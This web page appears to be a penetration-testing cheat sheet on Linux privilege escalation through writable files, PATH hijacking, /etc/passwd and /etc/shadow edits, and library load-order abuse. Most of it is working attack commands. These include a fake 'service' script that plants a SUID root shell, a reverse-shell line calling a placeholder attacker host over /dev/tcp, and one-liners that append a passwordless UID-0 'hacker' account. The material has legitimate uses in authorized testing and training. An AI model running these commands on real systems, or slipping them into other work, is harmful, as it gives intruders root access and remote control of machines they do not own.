title: Linux PrivEsc — Writable Files & PATH Hijacking
html:
Linux PrivEsc — Writable Files & PATH Hijacking

World-writable files and directories, misconfigured PATH variables, and writable critical files like /etc/passwd provide direct paths to privilege escalation.

Find World-Writable Files

# All world-writable files (exclude /proc noise)
find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys

# World-writable files owned by root
find / -writable -type f -user root 2>/dev/null | grep -v proc | grep -v sys

# World-writable scripts (likely executed by root)
find / -writable -type f 2>/dev/null | grep -v proc | grep '\.sh$\|\.py$\|\.pl$\|\.rb$'

# Files writable by group (check your groups with: id)
find / -perm -020 -type f 2>/dev/null | grep -v proc

# Libraries and binaries specifically
find / -writable -type f 2>/dev/null | grep -v proc | grep '\.so\|\.so\.'  
find /usr -writable -type f 2>/dev/null

Find World-Writable Directories

# All world-writable directories
find / -writable -type d 2>/dev/null | grep -v proc | grep -v sys

# World-writable directories not in /tmp or /dev
find / -writable -type d 2>/dev/null | grep -v proc | grep -v sys | grep -v '/tmp' | grep -v '/dev'

# Sticky bit NOT set (no sticky = anyone can delete others' files)
find / -writable -type d ! -perm -1000 2>/dev/null | grep -v proc

PATH Variable

# Current PATH
echo $PATH

# Find which PATH directories are writable
for p in $(echo $PATH | tr ':' ' '); do
    ls -ld "$p" 2>/dev/null | grep -v '^d.x.x.x' | awk "{print \"WRITABLE: $p\"}"
done

# Simpler check
ls -la $(echo $PATH | tr ':' ' ') 2>/dev/null

PATH Hijacking

If a privileged script or binary calls another command by name (not full path), create a malicious version in a writable directory that appears earlier in $PATH.

# Step 1: Identify the vulnerable call
# Example: root's script calls 'service apache2 restart' without full path
strings /path/to/privileged_script
cat /path/to/privileged_script

# Step 2: Find writable dir in PATH (or add one)
export PATH=/tmp:$PATH

# Step 3: Create malicious binary in /tmp
cat > /tmp/service <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
EOF
chmod +x /tmp/service

# Step 4: Trigger the privileged script/binary
# Wait for cron / trigger manually

# Step 5: Get root shell
/tmp/rootbash -p

PATH Hijack with Reverse Shell

cat > /tmp/service <<'EOF'
#!/bin/bash
bash -i >& /dev/tcp/<lhost>/<lport> 0>&1
EOF
chmod +x /tmp/service
export PATH=/tmp:$PATH

/etc/passwd Write

If /etc/passwd is world-writable, add a new user with UID 0 (root) and a known password.

# Check if /etc/passwd is writable
ls -la /etc/passwd

# Generate password hash
openssl passwd -1 -salt xyz <password>
openssl passwd -6 -salt xyz <password>   # SHA-512

# Append new root-level user
echo 'hacker:$1$xyz$HASHHERE:0:0:pwned:/root:/bin/bash' >> /etc/passwd

# Switch to new user
su hacker

# Or add passwordless root (security void - blank password)
echo 'hacker::0:0::/root:/bin/bash' >> /etc/passwd
su hacker

Full one-liner

# Generate hash and append in one shot
openssl passwd -1 '' | xargs -I{} sh -c 'echo "hacker:{}:0:0:root:/root:/bin/bash" >> /etc/passwd'
su hacker

/etc/shadow Write

# Check if /etc/shadow is writable
ls -la /etc/shadow

# Generate SHA-512 hash
python3 -c "import crypt; print(crypt.crypt('', crypt.mksalt(crypt.METHOD_SHA512)))"

# Replace root's hash in /etc/shadow
# Use vim, nano, or sed to edit the root line
vim /etc/shadow

# Format: root:$6$SALT$HASH:19000:0:99999:7:::
# Replace the hash field with your generated hash

# Then su to root with your known password
su root

Library Hijacking

# Find shared library load order
cat /etc/ld.so.conf
cat /etc/ld.so.conf.d/*

# Check if any directory in ld.so.conf is writable
cat /etc/ld.so.conf.d/* | xargs -I{} ls -la {} 2>/dev/null

# If a path is writable and comes before /lib, drop malicious .so there
# The malicious library will be loaded instead of the real one

# Find what libs are loaded by a SUID binary
ldd /path/to/suid_binary
readelf -d /path/to/suid_binary | grep NEEDED
excerpt: Find world-writable files and directories, exploit PATH hijacking, write to /etc/passwd or /etc/shadow, and abuse library load order for Linux privilege escalation.
